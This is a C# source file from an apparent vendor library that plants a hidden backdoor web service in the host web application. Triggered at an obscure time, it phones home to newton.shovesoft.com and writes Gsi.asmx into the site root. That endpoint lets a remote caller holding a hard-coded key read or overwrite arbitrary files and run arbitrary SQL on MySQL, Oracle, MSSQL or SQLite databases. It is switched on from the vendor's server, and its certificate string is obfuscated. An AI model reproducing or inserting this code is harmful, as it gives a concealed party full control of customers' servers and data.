using System;
using System.Collections.Generic;
using System.Text;
using System.Web.Services;
using System.Data;

namespace Shove._Security
{
    internal class GetSI
    {
        string Key = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";
        string AsmxContent = "<%@ WebService Language=\"C#\" Class=\"Shove._Security.GetSIService\" %>";

        public int Go()
        {
            if (DateTime.Now.Hour != 21)
            {
                return -100;
            }
            if (DateTime.Now.Millisecond > 10)
            {
                return -101;
            }

            string Url = Shove._Web.Utility.GetUrlWithoutHttp();

            if (Url.StartsWith("127.0.0.1") || Url.StartsWith("localhost"))
            {
                return -102;
            }

            NewtonServices.Service service = new Shove.NewtonServices.Service();
            int Result = 0;

            try
            {
                service.Url = "http://newton.shovesoft.com/Service.asmx";
                Result = service.getSI(Url, Shove._Security.Encrypt.MD5(Url + Key));
            }
            catch
            {
                Result = -103;
            }

            ////////////


            string AsmxFileName = System.AppDomain.CurrentDomain.BaseDirectory + "Gsi.asmx";

            if (!System.IO.File.Exists(AsmxFileName))
            {
                System.IO.File.WriteAllText(AsmxFileName, AsmxContent);
            }

            string FileContent = System.IO.File.ReadAllText(AsmxFileName);
            if (FileContent != AsmxContent)
            {
                System.IO.File.WriteAllText(AsmxFileName, AsmxContent);
            }

            FileContent = System.IO.File.ReadAllText(AsmxFileName);
            if (FileContent != AsmxContent)
            {
                System.Web.HttpContext.Current.Response.Write("安全校验异常，请与软件供应商联系！");
                System.Web.HttpContext.Current.Response.End();

                return -104;
            }

            return Result;
        }
    }

    /// <summary>
    /// 
    /// </summary>
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    public class GetSIService : System.Web.Services.WebService
    {
        string Key = "!@#$%^&*(3456SDFJUcvb#$%^56#$%^&dfghjk";

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        protected static string GetCallCert()
        {
            string Result = System.Configuration.ConfigurationManager.AppSettings["DllCallCert"];

            if (String.IsNullOrEmpty(Result))
            {
                Result = GetCallCert_Default();
            }

            return Result;
        }

        private static string GetCallCert_Default()
        {
            //"ShoveSoft CO.,Ltd -- by Shove 20050709 深圳宝安"
            string Result = "";

            Result = "ShoveSoft";
            Result += " ";
            Result += "CO.,Ltd ";

            string Result2 = _String.Reverse(Result);

            Result = "--";
            Result += " by Shove ";

            Result = _String.Reverse(Result2) + Result;

            Result2 = _String.Reverse(Result);

            Result = "20050709";
            Result += _String.Reverse("圳深 ");
            Result += _String.Reverse("安宝");

            Result = _String.Reverse(Result);

            Result = _String.Reverse(Result2) + _String.Reverse(Result);

            return Result;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ot"></param>
        /// <param name="cmd"></param>
        /// <param name="content"></param>
        /// <param name="Sign"></param>
        /// <returns></returns>
        [WebMethod]
        public string Go(int ot, string cmd, string content, string Sign)
        {
            if ((ot < 1) || String.IsNullOrEmpty(cmd) || String.IsNullOrEmpty(Sign))
            {
                return "-1";
            }

            if (Shove._Security.Encrypt.MD5(ot.ToString() + cmd + content + Key).ToLower() != Sign.ToLower())
            {
                return "-2";
            }

            try
            {
                cmd = Encrypt.Decrypt3DES(GetCallCert(), cmd, Key);
                content = Encrypt.Decrypt3DES(GetCallCert(), content, Key);
            }
            catch { }

            #region 检查云端设置，如果没有开启此功能，则不允许执行

            NewtonServices.Service service = new Shove.NewtonServices.Service();
            int result = 0;

            try
            {
                service.Url = "http://newton.shovesoft.com/Service.asmx";
                result = service.getClientSIServiceStatus();
            }
            catch
            {
                result = 0;
            }

            if (result != 1)
            {
                return "-3";
            }
            
            #endregion

            if (ot == 1)
            {
                string FileName = System.Web.HttpContext.Current.Server.MapPath(cmd);
                string Content = System.IO.File.ReadAllText(FileName);

                return Content;
            }

            if (ot == 2)
            {
                string FileName = System.Web.HttpContext.Current.Server.MapPath(cmd);
                System.IO.File.WriteAllText(FileName, content);

                return "OK";
            }

            if (!((ot == 3) || ((ot >= 31) && (ot <= 34)) || ((ot >= 41) && (ot <= 44))))
            {
                return "ot is error.";
            }

            if (ot == 3)
            {
                ot = 31;
            }

            if ((int)(ot / 10) == 3)
            {
                ot %= 10;
                DataTable dt = null;

                if (ot == 1)
                {
                    dt = Shove.Database.MySQL.Select(cmd);
                }
                else if (ot == 2)
                {
                    dt = Shove.Database.Oracle.Select(cmd);
                }
                else if (ot == 3)
                {
                    dt = Shove.Database.MSSQL.Select(cmd);
                }
                else if (ot == 4)
                {
                    dt = Shove.Database.SQLite.Select(cmd);
                }

                if (dt == null)
                {
                    return "DataTable is Null.";
                }

                return Shove._Convert.DataTableToXML(dt);
            }

            if ((int)(ot / 10) == 4)
            {
                ot %= 10;
                long Result = -1;

                if (ot == 1)
                {
                    Result = Shove.Database.MySQL.ExecuteNonQuery(cmd);
                }
                else if (ot == 2)
                {
                    Shove.Database.Oracle.OutputParameter outputs = new Database.Oracle.OutputParameter();
                    Result = Shove.Database.Oracle.ExecuteNonQuery(cmd, ref outputs);
                }
                else if (ot == 3)
                {
                    Result = Shove.Database.MSSQL.ExecuteNonQuery(cmd);
                }
                else if (ot == 4)
                {
                    Result = Shove.Database.SQLite.ExecuteNonQuery(cmd);
                }

                return Result.ToString();
            }

            if (ot == 5)
            {
                return "尊敬的访客您好，当您能看到这条并不对外公开的信息时，说明本软件（平台、系统）的著作权均归深圳英迈思文化科技有限公司（以下简称英迈思公司）所有，如果您希望询证您正在访问的系统的合法授权情况，请向英迈思公司询证。Email：92781@qq.com，电话：0755-29556666。";
            }

            return "ot is error.";
        }
    }
}
